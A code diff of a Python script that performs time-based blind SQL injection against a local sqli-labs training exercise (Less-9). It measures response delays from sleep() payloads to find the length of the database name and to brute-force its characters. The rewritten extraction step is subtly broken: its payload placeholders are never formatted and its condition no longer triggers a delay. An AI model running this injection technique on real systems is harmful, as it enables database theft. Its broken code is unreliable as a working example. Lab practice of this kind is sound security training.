@@ -8,6 +8,7 @@ import time
 
 # 获取数据库名长度
 def database_len():
+    dbLen = 0
     for i in range(1, 10):
         url = '''http://127.0.0.1/sqli-labs/Less-9/index.php'''
         payload = '''?id=1' and if(length(database())>%s,sleep(1),0)''' % i
@@ -19,25 +20,41 @@ def database_len():
         if sec >= 1:
             print(i)
         else:
-            print(i)
+            dbLen=i
+            print(dbLen)
             break
-    print('database_len:', i)
+    print('database_len:', dbLen)
 
 
 database_len()
 
-
 # 获取数据库名
-def GetDBName():
+def GetDBName(url):
+    dbLen = 0
+    for i in range(1, 10):
+        url = '''http://127.0.0.1/sqli-labs/Less-9/index.php'''
+        payload = '''?id=1' and if(length(database())>%s,sleep(1),0)''' % i
+        # print(url+payload+'%23')
+        time1 = datetime.datetime.now()
+        r = requests.get(url + payload + '%23')
+        time2 = datetime.datetime.now()
+        sec = (time2 - time1).seconds
+        if sec >= 1:
+
+            print(i)
+        else:
+            dbLen = i
+            print(dbLen)
+            break
+    print('database_len:', dbLen)
     name = ''
-    for j in range(1, 9):
-        for i in '0123456789abcdefghijklmnopqrstuvwxyz':
-            url = '''http://127.0.0.1/sqli-labs/Less-9'''
-            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(1),1)''' % (
-                j, i)
+    for j in range(1, dbLen+1):
+        for i in range(33, 128):
+            payload = "?id=1' and if(ascii(substr(database(),{0},1))={1},1,0) %23"
+            targetUrl = url + payload
             # print(url+payload+'%23')
             time1 = datetime.datetime.now()
-            r = requests.get(url + payload + '%23')
+            r = requests.get(targetUrl)
             time2 = datetime.datetime.now()
             sec = (time2 - time1).seconds
             if sec >= 1:
